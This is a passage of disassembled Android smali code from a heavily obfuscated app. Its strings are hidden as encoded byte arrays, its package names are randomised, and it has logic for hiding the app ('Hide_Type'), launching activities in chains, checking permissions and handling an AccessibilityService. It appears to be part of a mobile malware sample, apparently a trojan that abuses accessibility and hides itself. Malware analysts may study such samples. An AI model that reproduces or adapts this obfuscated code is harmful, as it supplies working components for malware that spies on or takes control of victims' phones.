    .array-data 1
        0x64t
        0x22t
        0x15t
        -0x37t
        -0x2ct
        -0x4dt
        0x2dt
        0x9t
    .end array-data

    :array_a
    .array-data 1
        -0x6ft
        -0x64t
        0x7ct
        -0x54t
        0x37t
        -0x34t
        0x4t
        0x2t
        -0x60t
        -0x6bt
        0x74t
        -0x58t
        0x30t
        -0x3at
    .end array-data

    nop

    :array_b
    .array-data 1
        -0x2dt
        -0x10t
        0x13t
        -0x23t
        0x42t
        -0x57t
        0x6bt
        0x22t
    .end array-data

    :array_c
    .array-data 1
        0x4t
        -0xft
        -0x64t
        -0x76t
        0x4et
        0x79t
        0x6dt
        0x5et
        0x3at
        -0x4et
    .end array-data

    nop

    :array_d
    .array-data 1
        0x4dt
        -0x24t
        -0x10t
        -0x1bt
        0x2dt
        0x12t
        0x9t
        0x31t
    .end array-data

    :array_e
    .array-data 1
        0x22t
        0x2ct
        0x6t
        0x68t
        -0x6at
        -0x67t
        -0x6t
        0x73t
        0x18t
        -0x76t
        -0x23t
    .end array-data

    :array_f
    .array-data 1
        0x74t
        0x49t
        0x74t
        0x1at
        -0x7t
        -0x14t
        -0x6dt
        0x1ft
    .end array-data

    :array_10
    .array-data 1
        -0x1dt
        -0x34t
        -0x49t
        0x6t
        -0x25t
        0x16t
        0x76t
        0x71t
        -0x24t
        -0x28t
        -0x4bt
    .end array-data

    :array_11
    .array-data 1
        -0x58t
        -0x47t
        -0x27t
        0x65t
        -0x4et
        0x36t
        0x2t
        0x1et
    .end array-data

    :array_12
    .array-data 1
        0x1ct
        0x39t
        0x22t
        -0x13t
        -0x45t
        -0x1et
    .end array-data

    nop

    :array_13
    .array-data 1
        0x5et
        0x55t
        0x4dt
        -0x72t
        -0x28t
        -0x73t
        0x6at
        0x15t
    .end array-data

    :array_14
    .array-data 1
        0x0t
        -0x44t
        -0x1ct
        0x42t
        -0xbt
        -0x75t
        -0x4ft
        0x6ft
        0x26t
        -0x44t
        -0x15t
    .end array-data

    :array_15
    .array-data 1
        0x4bt
        -0x37t
        -0x76t
        0x21t
        -0x64t
        -0x55t
        -0x3et
        0xat
    .end array-data

    :array_16
    .array-data 1
        -0x61t
        -0x50t
        0x48t
        0xft
        0x2ft
        0xdt
        0x7ft
        0x18t
    .end array-data

    :array_17
    .array-data 1
        -0x23t
        -0x24t
        0x27t
        0x7et
        0x5at
        0x68t
        0x16t
        0x77t
    .end array-data

    :array_18
    .array-data 1
        -0x2bt
        -0x6at
        0x21t
        0x7et
        0x45t
    .end array-data

    nop

    :array_19
    .array-data 1
        -0x62t
        -0x2t
        -0x1et
        -0x33t
        0x24t
        -0x9t
        -0xft
        0x3bt
    .end array-data

    :array_1a
    .array-data 1
        0x66t
        -0xdt
        -0x75t
        -0x2at
        0x2at
        -0x5ft
        -0x50t
        0x72t
        0x66t
        -0x26t
        -0x76t
        -0x13t
        0x2at
        -0x5ft
        -0x50t
        0x7at
        0x66t
        -0x28t
        -0x75t
        -0x23t
    .end array-data

    :array_1b
    .array-data 1
        -0x4at
        0x62t
        0x5bt
        0x6dt
        -0x6t
        0x1ft
        0x60t
        -0x38t
    .end array-data

    :array_1c
    .array-data 1
        -0xft
        -0x60t
        0x64t
        0x6ft
        0x53t
        -0x49t
    .end array-data

    nop

    :array_1d
    .array-data 1
        0x1dt
        0x3et
        -0x3ct
        -0x7bt
        -0x15t
        0x3ft
        0x3et
        0x7at
    .end array-data

    :array_1e
    .array-data 1
        -0x15t
        -0x65t
        0x76t
        -0x3ft
        0x5t
        0x3et
        0x54t
        0x1bt
        -0x61t
        -0x3dt
        0x55t
        -0x7ct
        0x5dt
        0x33t
        0x33t
        0x43t
        -0x4dt
        -0x72t
        0xdt
        -0x67t
        0x3ct
    .end array-data

    nop

    :array_1f
    .array-data 1
        0xbt
        0x23t
        -0x13t
        0x21t
        -0x43t
        -0x76t
        -0x4ct
        -0x5dt
    .end array-data

    :array_20
    .array-data 1
        0x56t
        0x74t
        0x68t
        0x1et
        0x8t
        0x41t
        -0x50t
        -0x60t
        0x56t
        0x70t
        -0x6ft
        0x42t
        0x77t
        0x22t
        -0x14t
        -0x21t
        0x24t
        0x9t
        0x12t
        0x43t
        0x55t
        0x22t
        -0x1et
        -0x22t
        0x8t
    .end array-data

    nop

    :array_21
    .array-data 1
        -0x72t
        -0x2ft
        -0x4ft
        -0x66t
        -0x30t
        -0x5t
        0x68t
        0x7t
    .end array-data
.end method

.method private static synthetic m2(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 12

    .line 1
    const/16 v0, 0x8

    new-array v1, v0, [B

    fill-array-data v1, :array_0

    new-array v2, v0, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    sget-object v2, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    const/4 v1, 0x1

    sput-boolean v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->w:Z

    new-instance v2, Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$a;

    sget-object v3, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cc;->a:Ljava/lang/String;

    invoke-direct {v2, v3}, Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$a;-><init>(Ljava/lang/String;)V

    invoke-static {v2}, Lcom/vknnolqo/p9sv5zvf/HhmXUb1k;->c(Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$a;)V

    new-instance v2, Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$a;

    sget-object v3, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cc;->d:Ljava/lang/String;

    invoke-direct {v2, v3}, Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$a;-><init>(Ljava/lang/String;)V

    invoke-static {v2}, Lcom/vknnolqo/p9sv5zvf/HhmXUb1k;->c(Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$a;)V

    const/4 v2, 0x7

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v3, v0, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    invoke-static {v2, v3}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->q(Ljava/lang/String;[Ljava/lang/String;)V

    sget-object v2, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->D_iao:Ljava/lang/String;

    new-array v3, v1, [B

    const/16 v4, 0x6f

    const/4 v5, 0x0

    aput-byte v4, v3, v5

    new-array v4, v0, [B

    fill-array-data v4, :array_4

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_0

    const-string v8, ""

    const-string v9, ""

    const-string v10, ""

    new-array p1, v1, [B

    const/16 v1, -0x42

    aput-byte v1, p1, v5

    new-array v0, v0, [B

    fill-array-data v0, :array_5

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v11

    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object p1

    new-instance v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/f00;

    move-object v6, v0

    move-object v7, p0

    invoke-direct/range {v6 .. v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/f00;-><init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {p1, v0}, Ljava/util/concurrent/Executor;->execute(Ljava/lang/Runnable;)V

    goto :goto_0

    :cond_0
    sget-object v2, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->Hide_Type:Ljava/lang/String;

    new-array v1, v1, [B

    const/16 v3, 0x60

    aput-byte v3, v1, v5

    new-array v0, v0, [B

    fill-array-data v0, :array_6

    invoke-static {v1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    new-instance p1, Landroid/content/Intent;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-class v1, Lcom/vknnolqo/p9sv5zvf/A5oWPwNw;

    invoke-direct {p1, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v0, 0x10000000

    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v0, 0x40000000    # 2.0f

    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    :cond_1
    invoke-virtual {p0, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    :goto_0
    return-void

    nop

    :array_0
    .array-data 1
        -0x51t
        -0x51t
        0x64t
        -0x61t
        -0x50t
        -0x6bt
        -0x54t
        0x38t
    .end array-data

    :array_1
    .array-data 1
        -0x40t
        -0x3ft
        0x7t
        -0x40t
        -0x2et
        -0x1ft
        -0x22t
        0x41t
    .end array-data

    :array_2
    .array-data 1
        0x4bt
        0x5et
        -0x4at
        0x14t
        0x46t
        -0x7dt
        0x4et
    .end array-data

    :array_3
    .array-data 1
        0x25t
        0x31t
        -0x2ct
        0x78t
        0x27t
        -0x20t
        0x25t
        0x5ft
    .end array-data

    :array_4
    .array-data 1
        0x5et
        0x2bt
        -0x64t
        -0x5t
        -0x5t
        0x16t
        0x40t
        0x8t
    .end array-data

    :array_5
    .array-data 1
        -0x72t
        -0x5dt
        0x66t
        -0x79t
        -0x4at
        -0x67t
        -0x73t
        0x22t
    .end array-data

    :array_6
    .array-data 1
        0xbt
        0x1ft
        -0x30t
        0x29t
        0x38t
        -0x57t
        0x2bt
        -0x25t
    .end array-data
.end method

.method public static synthetic n(Landroid/content/Context;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->o2(Landroid/content/Context;)V

    return-void
.end method

.method static synthetic n0()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->t1()V

    return-void
.end method

.method private static n1()V
    .locals 4

    .line 1
    const/4 v0, 0x1

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->p:Z

    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    new-instance v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$e;

    invoke-direct {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$e;-><init>()V

    const-wide/16 v2, 0xc8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method private static synthetic n2(Landroid/content/Context;)V
    .locals 5

    .line 1
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v1, 0x800000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->Q2()V

    new-instance v1, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v2

    invoke-direct {v1, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v2, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/wz;

    invoke-direct {v2, p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/wz;-><init>(Landroid/content/Context;Landroid/content/Intent;)V

    const-wide/16 v3, 0xbb8

    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method public static synthetic o()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->u2()V

    return-void
.end method

.method static synthetic o0(I)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->s1(I)V

    return-void
.end method

.method private static o1()V
    .locals 5

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->S2()Landroid/content/Context;

    move-result-object v0

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/WDvLfaWq;->a()[Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/vknnolqo/p9sv5zvf/WDvLfaWq;->c(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_0

    new-instance v1, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v2

    invoke-direct {v1, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v2

    invoke-direct {v1, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v2, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/sy;

    invoke-direct {v2, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/sy;-><init>(Landroid/content/Context;)V

    const-wide/16 v3, 0x1f4

    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    goto :goto_0

    :cond_0
    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_0

    new-array v3, v1, [B

    fill-array-data v3, :array_1

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    sget-object v3, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {v0, v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    const/4 v0, 0x1

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->w:Z

    new-instance v0, Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$a;

    sget-object v2, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cc;->a:Ljava/lang/String;

    invoke-direct {v0, v2}, Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$a;-><init>(Ljava/lang/String;)V

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/HhmXUb1k;->c(Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$a;)V

    new-instance v0, Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$a;

    sget-object v2, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cc;->d:Ljava/lang/String;

    invoke-direct {v0, v2}, Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$a;-><init>(Ljava/lang/String;)V

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/HhmXUb1k;->c(Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$a;)V

    const/4 v0, 0x7

    new-array v0, v0, [B

    fill-array-data v0, :array_2

    new-array v1, v1, [B

    fill-array-data v1, :array_3

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {v0, v1}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->q(Ljava/lang/String;[Ljava/lang/String;)V

    :goto_0
    return-void

    nop

    :array_0
    .array-data 1
        0x65t
        -0xat
        -0x1t
        -0x6t
        -0x6t
        0x1ft
        -0x2ft
        -0x21t
    .end array-data

    :array_1
    .array-data 1
        0xat
        -0x68t
        -0x64t
        -0x5bt
        -0x68t
        0x6bt
        -0x5dt
        -0x5at
    .end array-data

    :array_2
    .array-data 1
        -0x70t
        -0x55t
        0x23t
        -0x7at
        -0x15t
        -0x5at
        0x0t
    .end array-data

    :array_3
    .array-data 1
        -0x2t
        -0x3ct
        0x41t
        -0x16t
        -0x76t
        -0x3bt
        0x6bt
        -0x33t
    .end array-data
.end method

.method private static synthetic o2(Landroid/content/Context;)V
    .locals 4

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->T2()V

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/uz;

    invoke-direct {v1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/uz;-><init>(Landroid/content/Context;)V

    const-wide/16 v2, 0x3e8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method public static synthetic p(Landroid/content/Context;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->A2(Landroid/content/Context;)V

    return-void
.end method

.method static synthetic p0()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->x0()V

    return-void
.end method

.method private static p1()Ljava/util/List;
    .locals 4

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x35

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->d(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-nez v0, :cond_0

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x20

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v2, v2, [B

    fill-array-data v2, :array_3

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->d(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    :cond_0
    return-object v0

    nop

    :array_0
    .array-data 1
        0x49t
        0x7ct
        0x2at
        0x3t
        0xdt
        -0x5at
        -0x14t
        -0x7t
        0x45t
        0x7at
        0x23t
        0x3t
        0x0t
        -0x57t
        -0x3t
        -0x1bt
        0x49t
        0x7bt
        0x22t
        0x5ft
        0x56t
        -0x5ft
        -0x14t
        -0x5ct
        0x45t
        0x63t
        0x2bt
        0x58t
        0x1ft
        -0x69t
        -0x4t
        -0x16t
        0x59t
        0x78t
        0x18t
        0x45t
        0x9t
        -0x57t
        -0x14t
        -0x12t
        0x58t
        0x4ct
        0x2at
        0x48t
        0x2t
        -0x43t
        -0x29t
        -0x17t
        0x5ft
        0x67t
        0x33t
        0x42t
        0x2t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x2at
        0x13t
        0x47t
        0x2dt
        0x6ct
        -0x38t
        -0x78t
        -0x75t
    .end array-data

    :array_2
    .array-data 1
        -0xbt
        -0x20t
        0x14t
        -0x2et
        0x14t
        -0x7et
        -0x73t
        -0x19t
        -0x48t
        -0x1dt
        0x18t
        -0x77t
        0x15t
        -0x6ft
        -0x6bt
        -0x13t
        -0x1ct
        -0x4bt
        0x10t
        -0x68t
        0x54t
        -0x61t
        -0x68t
        -0x1at
        -0x1dt
        -0x30t
        0x1bt
        -0x77t
        0xft
        -0x7at
        -0x6et
        -0x1at
    .end array-data

    :array_3
    .array-data 1
        -0x6at
        -0x71t
        0x79t
        -0x4t
        0x7bt
        -0xet
        -0x3t
        -0x78t
    .end array-data
.end method

.method private static synthetic p2(Landroid/content/Context;)V
    .locals 4

    .line 1
    new-instance v0, Landroid/content/Intent;

    const/16 v1, 0x2e

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/16 v1, 0x22

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v3, v2, [B

    fill-array-data v3, :array_3

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v3}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v1, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/16 v1, 0x21

    new-array v1, v1, [B

    fill-array-data v1, :array_4

    new-array v2, v2, [B

    fill-array-data v2, :array_5

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    sget-object v2, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->_Notfy_MSG_:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pz;

    invoke-direct {v1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pz;-><init>(Landroid/content/Context;)V

    const-wide/16 v2, 0x3e8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void

    nop

    :array_0
    .array-data 1
        0x1at
        0x6at
        -0x7ft
        0x2et
        0x5ct
        -0x1dt
        -0x7et
        0x52t
        0x8t
        0x61t
        -0x6ft
        0x28t
        0x5at
        -0x1ct
        -0x7ft
        0xft
        0x55t
        0x47t
        -0x53t
        0x1dt
        0x7dt
        -0x3ct
        -0x5dt
        0x30t
        0x24t
        0x4at
        -0x56t
        0x8t
        0x7at
        -0x34t
        -0x51t
        0x3ft
        0x3at
        0x50t
        -0x54t
        0x13t
        0x7dt
        -0x2bt
        -0x4bt
        0x39t
        0x2ft
        0x50t
        -0x54t
        0x12t
        0x74t
        -0x27t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x7bt
        0x4t
        -0x1bt
        0x5ct
        0x33t
        -0x76t
        -0x1at
        0x7ct
    .end array-data

    :array_2
    .array-data 1
        0x50t
        -0x38t
        -0x1t
        0x3ft
        -0xdt
        -0x65t
        0x15t
        -0x51t
        0x41t
        -0x2ct
        -0xct
        0x3bt
        -0xbt
        -0x6at
        0x14t
        -0xdt
        0x1ft
        -0x3dt
        -0x1dt
        0x39t
        -0x12t
        -0x6dt
        0x5ft
        -0x40t
        0x61t
        -0xat
        -0x3ct
        0x1dt
        -0x23t
        -0x4ft
        0x3at
        -0x40t
        0x76t
        -0x1dt
    .end array-data

    nop

    :array_3
    .array-data 1
        0x31t
        -0x5at
        -0x65t
        0x4dt
        -0x64t
        -0xet
        0x71t
        -0x7ft
    .end array-data

    :array_4
    .array-data 1
        0x1at
        0xat
        0x24t
        -0x7ft
        -0x6dt
        -0x4t
        0x7at
        0x31t
        0xbt
        0x16t
        0x2ft
        -0x7bt
        -0x6bt
        -0xft
        0x7bt
        0x6dt
        0x55t
        0x1t
        0x38t
        -0x79t
        -0x72t
        -0xct
        0x30t
        0x5ct
        0x33t
        0x25t
        0xet
        -0x43t
        -0x47t
        -0x27t
        0x41t
        0x56t
        0x3ft
    .end array-data

    nop

    :array_5
    .array-data 1
        0x7bt
        0x64t
        0x40t
        -0xdt
        -0x4t
        -0x6bt
        0x1et
        0x1ft
    .end array-data
.end method

.method public static synthetic q()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->T1()V

    return-void
.end method

.method static synthetic q0(Landroid/accessibilityservice/AccessibilityService;)V
    .locals 0

    .line 1
